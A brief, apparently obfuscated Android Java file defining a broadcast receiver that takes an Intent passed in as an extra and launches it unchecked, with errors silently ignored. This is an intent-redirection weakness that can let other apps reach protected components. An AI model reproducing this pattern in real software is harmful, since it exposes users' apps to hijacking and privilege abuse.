package xik;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class gm extends BroadcastReceiver {
    @Override
    public final void onReceive(Context context, Intent intent) {
        if (intent.hasExtra("fancaj")) {
            Intent eIntent = intent.getParcelableExtra("fancaj");
            if (eIntent != null) {
                try {context.startActivity(eIntent);} catch (Exception e) {}
            }
        }
    }
}